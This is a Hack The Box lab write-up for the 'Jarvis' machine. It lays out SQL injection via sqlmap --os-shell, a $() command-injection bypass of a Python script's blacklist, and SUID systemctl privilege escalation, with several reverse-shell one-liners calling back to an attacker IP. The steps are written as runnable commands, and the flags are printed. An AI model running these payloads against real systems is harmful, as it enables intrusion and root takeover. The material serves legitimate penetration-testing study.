# HTB - Jarvis

## Machine Info

|Field|Details|
|---|---|
|OS|Linux (Debian)|
|Difficulty|Medium|
|IP|10.129.229.137|
|User|pepper|
|User flag|`cdb2aac5c6272371d53e40d40f50217d`|
|Root flag|`89d91a6dce5077a70ef7febc9cb64b4f`|

## Tags

#htb #linux #sqli #sqlmap #command-injection #sudo-misconfiguration #suid #systemctl #oscp-like

---

## Attack Path Overview

```
Nmap → port 80 (Apache + IronWAF), port 64999
→ room.php?cod= SQL injection (MySQL)
→ sqlmap --os-shell → www-data shell
→ sudo -u pepper simpler.py -p → command injection via $()
→ pepper shell → user flag
→ find SUID: /bin/systemctl
→ systemctl service file → reverse shell as root
→ root flag
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.229.137
nmap -sV -sC -p 22,80,64999 10.129.229.137
```

|Port|Service|
|---|---|
|22|SSH (OpenSSH 7.4p1)|
|80|HTTP (Apache 2.4.25 + IronWAF 2.0.3)|
|64999|HTTP (Apache - WAF banner page)|

### Web Enumeration

```bash
gobuster dir -u http://10.129.229.137 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Discovered:

- `/phpmyadmin` — phpMyAdmin panel
- `index.php` — hotel booking site (PHP)

Browsing the site reveals room booking pages with the parameter `?cod=`:

```
http://10.129.229.137/room.php?cod=1
```

Testing with a single quote `'` causes a noticeable response change → SQL injection confirmed.

---

## Foothold — SQL Injection → www-data Shell

### Identify Injection Point

```bash
sqlmap -u "http://10.129.229.137/room.php?cod=1" --level=3 --risk=3
```

Confirmed injectable parameter: **`cod`** (GET)

- Boolean-based blind
- Time-based blind
- UNION query (7 columns)

Backend DBMS: **MySQL** DB user: **DBadmin@localhost**

### Verify File Write Capability

```bash
sqlmap -u "http://10.129.229.137/room.php?cod=1" --privileges
```

`DBadmin` has `FILE` privilege → can write files to disk.

Web root: `/var/www/html`

### Get OS Shell via sqlmap

```bash
sqlmap -u "http://10.129.229.137/room.php?cod=1" --os-shell
# Select PHP (4)
# Web root: /var/www/html
```

Shell received as `www-data`.

### Upgrade to Proper Reverse Shell

```bash
# Kali listener
nc -lvnp 5555
```

In os-shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.240",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Lateral Movement — www-data → pepper

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### Analyzing simpler.py

The `-p` flag calls `exec_ping()`:

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

**Blacklist:** `&`, `;`, `-`, `` ` ``, `||`, `|`

**Not blocked:** `$()` — command substitution!

However `>&` is blocked due to `&`. Bypass: write a shell script and execute it via `$()`.

### Command Injection Exploit

```bash
# Create reverse shell script
echo 'bash -i >& /dev/tcp/10.10.17.240/4444 0>&1' > /tmp/shell.sh
chmod +x /tmp/shell.sh
```

Start listener:

```bash
nc -lvnp 4444
```

Run simpler.py as pepper:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

At the IP prompt:

```
$( bash /tmp/shell.sh)
```

Shell received as `pepper`.

---

## User Flag

```bash
cat /home/pepper/user.txt
# cdb2aac5c6272371d53e40d40f50217d
```

---

## Privilege Escalation — pepper → root (SUID systemctl)

### SUID Binary Discovery

```bash
find / -perm -4000 -user root -group pepper 2>/dev/null
# /bin/systemctl
```

`/bin/systemctl` has SUID bit set and is owned by the `pepper` group — pepper can run it with root privileges.

### Systemctl Service File Exploit

> ⚠️ **Key:** The service file must be in a directory pepper owns (e.g. `/home/pepper/.tmp/`), not `/tmp` — systemctl interprets absolute paths outside systemd directories as mount units.

```bash
# Create writable directory
mkdir /home/pepper/.tmp
cd /home/pepper/.tmp

# Create service file
TF=$(mktemp -p /home/pepper/.tmp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.17.240/6666 0>&1"
[Install]
WantedBy=multi-user.target' > $TF

# Start listener on Kali
# nc -lvnp 6666

# Link and enable service
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Root shell received.

---

## Root Flag

```bash
cat /root/root.txt
# 89d91a6dce5077a70ef7febc9cb64b4f
```

---

## Key Takeaways

- **IronWAF present but bypassable** — sqlmap with `--level=3 --risk=3` bypassed the WAF for SQLi detection
- **FILE privilege in MySQL** — `DBadmin` having FILE privilege enabled webshell upload and `--os-shell` via `INTO OUTFILE`
- **Command injection blacklist bypass** — `$()` not in blacklist; `>&` blocked but bypassed by writing payload to a script file
- **SUID systemctl privesc** — service file location matters; must be in a pepper-writable directory, not `/tmp`, to avoid being interpreted as a mount unit
- **7-column UNION injection** — always enumerate column count before crafting manual payloads

## Attack Chain Summary

|Step|Technique|Tool|
|---|---|---|
|SQLi Discovery|GET parameter `cod` fuzzing|sqlmap|
|Foothold|MySQL FILE priv → webshell|sqlmap --os-shell|
|Lateral Move|sudo simpler.py → `$()` injection|manual|
|PrivEsc|SUID systemctl → service file|systemctl|

## Credentials

|User|Access|Source|
|---|---|---|
|www-data|sqlmap os-shell|SQLi FILE write|
|DBadmin|MySQL user|SQLi current_user()|
|pepper|reverse shell|sudo simpler.py command injection|
|root|reverse shell|SUID systemctl service|